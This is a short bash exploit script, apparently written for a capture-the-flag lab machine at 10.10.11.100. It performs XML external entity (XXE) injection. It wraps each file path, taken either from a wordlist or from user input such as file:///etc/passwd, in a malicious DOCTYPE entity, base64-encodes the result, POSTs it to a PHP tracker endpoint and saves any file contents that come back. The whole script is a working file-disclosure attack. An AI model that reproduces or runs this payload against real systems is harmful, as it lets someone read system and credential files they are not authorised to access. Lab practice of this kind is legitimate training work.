#!/usr/bin/bash
## Pass 'x' as first arg to auto-attack, any other string to print full reply, otherwise script asks for input
explt1='<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE hack [ <!ENTITY mike SYSTEM "'
explt2='"> ]><bugreport><cwe>&mike;</cwe></bugreport>'
##########################################################
# Change this path and the target ip!                    #
compaths=~/Hacking/Info/Wordlists/common_paths-linux.txt #
targetip='10.10.11.100'
##########################################################

mkdir ExploitResults 2>/dev/null

attack(){
	echo "Trying ${1}..."

	if [[ ! -z ${2} ]]; then
		result=$(curl -X POST ${targetip}/tracker_diRbPr00f314.php -s --data-urlencode "data=${compiled}")
	else
		result=$(curl -X POST ${targetip}/tracker_diRbPr00f314.php -s --data-urlencode "data=${compiled}" | tail -n +9 | head -n -10)
	fi

	# echo "${result}"
	if [[ ${result} != '' ]]; then
		filename=$(sed 's/\//_/g' <<< ${1})
		echo "${result}"
		echo "${result}" > ./ExploitResults/${filename}
		echo -n 'Press enter to continue...'
		read
	fi
}

if [[ ${1} == 'x' ]]; then
	for menu in $(cat ${compaths}); do
		compiled=$(base64 -w 0 <<< "${explt1}${menu}${explt2}")
		attack ${menu}
	done
else
	echo -n "Enter command: "
	read menu #file:///etc/passwd
	compiled=$(base64 -w 0 <<< "${explt1}${menu}${explt2}")
	if [[ ! -z ${1} ]]; then
		attack ${menu} ${1}
	else
		attack ${menu}
	fi
fi



#echo "Raw: ${explt1}${menu}${explt2}"
#echo "Compiled: ${compiled}"
